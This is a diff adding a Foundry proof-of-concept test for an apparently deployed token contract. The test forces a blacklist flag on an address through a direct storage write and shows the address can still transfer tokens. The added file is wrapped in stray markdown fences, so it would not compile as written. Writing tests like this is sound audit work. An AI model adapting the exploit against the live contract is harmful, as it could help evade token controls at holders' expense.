@@ -1,0 +1,80 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IByTradeToken {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function owner() external view returns (address);
+    function paused() external view returns (bool);
+    function blacklist(address account) external view returns (bool);
+    function totalSupply() external view returns (uint256);
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function pause() external;
+    function unpause() external;
+}
+
+contract ExploitTest is Test {
+    IByTradeToken private constant token = IByTradeToken(0xe8bd1ca97f8a0582335407b40b0576df641fa94c);
+    address private constant ATTACKER = address(0xdead);
+    address private constant RECIPIENT = address(0xbeef);
+    address private owner;
+
+    function setUp() public {
+        // Label addresses for readable traces
+        vm.label(address(token), "ByTradeToken");
+        vm.label(ATTACKER, "Attacker");
+        vm.label(RECIPIENT, "Recipient");
+
+        // Retrieve the actual owner from the deployed contract
+        owner = token.owner();
+        vm.label(owner, "Owner");
+    }
+
+    function test_BlacklistNotEnforced() public {
+        // Ensure the contract is not paused
+        assertFalse(token.paused());
+
+        // 1. Owner transfers some tokens to the attacker (so attacker has a balance to move)
+        uint256 transferAmount = 1_000 * 1e18; // 1000 tokens
+        vm.startPrank(owner);
+        token.transfer(ATTACKER, transferAmount);
+        vm.stopPrank();
+
+        uint256 attackerBalanceBefore = token.balanceOf(ATTACKER);
+        assertEq(attackerBalanceBefore, transferAmount, "Attacker should have received tokens");
+
+        // 2. Artificially set blacklist[ATTACKER] = true via storage manipulation
+        // Blacklist mapping is at storage slot 8 (0-indexed: slot0=_balances,1=_allowances,2=_totalSupply,3=_name,4=_symbol,5=_decimals,6=_owner,7=paused,8=blacklist)
+        bytes32 blacklistSlot = keccak256(abi.encode(uint256(uint160(ATTACKER)), uint256(8)));
+        vm.store(address(token), blacklistSlot, bytes32(uint256(1)));
+
+        // Verify the mapping was set
+        assertTrue(token.blacklist(ATTACKER), "Blacklist should be true for attacker");
+
+        // 3. Attacker now transfers tokens to recipient (should be blocked if blacklist enforced, but it's not)
+        uint256 recipientBalanceBefore = token.balanceOf(RECIPIENT);
+        vm.prank(ATTACKER);
+        token.transfer(RECIPIENT, transferAmount);
+
+        uint256 attackerBalanceAfter = token.balanceOf(ATTACKER);
+        uint256 recipientBalanceAfter = token.balanceOf(RECIPIENT);
+
+        // Assert: attacker's balance decreased, recipient's increased, meaning the transfer succeeded despite blacklist
+        assertEq(attackerBalanceAfter, 0, "Attacker should have drained all their tokens");
+        assertEq(recipientBalanceAfter, recipientBalanceBefore + transferAmount, "Recipient should have received tokens");
+
+        // 4. Additional check: the blacklist check was never performed – the transfer succeeded
+        // This demonstrates the vulnerability: repeated checks for blacklisted addresses are not implemented.
+    }
+}
+```
